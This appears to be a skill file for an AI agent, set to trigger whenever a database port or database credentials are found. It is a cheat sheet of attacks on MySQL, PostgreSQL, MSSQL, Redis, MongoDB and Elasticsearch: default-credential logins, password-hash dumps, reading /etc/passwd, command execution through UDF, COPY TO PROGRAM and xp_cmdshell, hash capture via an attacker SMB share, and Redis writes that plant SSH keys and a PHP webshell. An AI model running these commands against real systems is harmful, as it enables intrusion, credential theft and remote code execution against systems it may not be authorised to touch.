---
name: svc-database
description: Database service attack techniques — auth bypass, UDF/xp_cmdshell/COPY-TO-PROGRAM RCE, file read/write, cred dump. Use when a database service is found or you have DB creds. Triggers - MySQL 3306, PostgreSQL 5432, MSSQL 1433, Oracle 1521, Redis 6379, MongoDB 27017, db banner, default DB creds, NOAUTH.
---

# Database Attack Reference

## MySQL (3306)
```bash
# Default/empty password
mysql -h <target> -u root
mysql -h <target> -u root -p root

# Nmap scripts
nmap --script mysql-info,mysql-enum,mysql-empty-password -p 3306 <target>

# If authenticated
mysql> SELECT @@version;
mysql> SHOW DATABASES;
mysql> SELECT user,authentication_string FROM mysql.user;

# File read (requires FILE privilege)
mysql> SELECT LOAD_FILE('/etc/passwd');

# UDF command execution (requires write to plugin dir)
# Upload lib_mysqludf_sys.so → SELECT sys_exec('id');
```

## PostgreSQL (5432)
```bash
# Default credentials
psql -h <target> -U postgres
psql -h <target> -U postgres -W   # try: postgres, password, admin

# Nmap scripts
nmap --script pgsql-brute -p 5432 <target>

# If authenticated
postgres=# SELECT version();
postgres=# \l                        -- list databases
postgres=# SELECT usename, passwd FROM pg_shadow;

# Command execution (superuser)
postgres=# COPY (SELECT '') TO PROGRAM 'id';
# Or via large objects
```

## MSSQL (1433)
```bash
# Default SA account
impacket-mssqlclient <target> -windows-auth
impacket-mssqlclient sa:''@<target>

# Nmap scripts
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-brute -p 1433 <target>

# If authenticated — command execution
SQL> EXEC xp_cmdshell 'whoami';
# Enable if disabled
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# File read
SQL> EXEC xp_dirtree '\\<attacker>\share';   # capture hash via responder
```

## Redis (6379)
```bash
# No-auth access
redis-cli -h <target> INFO
redis-cli -h <target> CONFIG GET *
redis-cli -h <target> KEYS *

# SSH key write for RCE
redis-cli -h <target> CONFIG SET dir /root/.ssh
redis-cli -h <target> CONFIG SET dbfilename authorized_keys
redis-cli -h <target> SET payload "\n\nssh-rsa AAAA...your_key...\n\n"
redis-cli -h <target> SAVE

# Webshell via Redis
redis-cli -h <target> CONFIG SET dir /var/www/html
redis-cli -h <target> CONFIG SET dbfilename shell.php
redis-cli -h <target> SET payload '<?php system($_GET["cmd"]); ?>'
redis-cli -h <target> SAVE
```

## MongoDB (27017)
```bash
# No-auth access
mongosh --host <target> --eval "db.adminCommand('listDatabases')"
mongosh --host <target> <db_name> --eval "db.getCollectionNames()"
```

## Elasticsearch (9200)
```bash
curl http://<target>:9200/
curl http://<target>:9200/_cat/indices?v
curl http://<target>:9200/_search?pretty
```
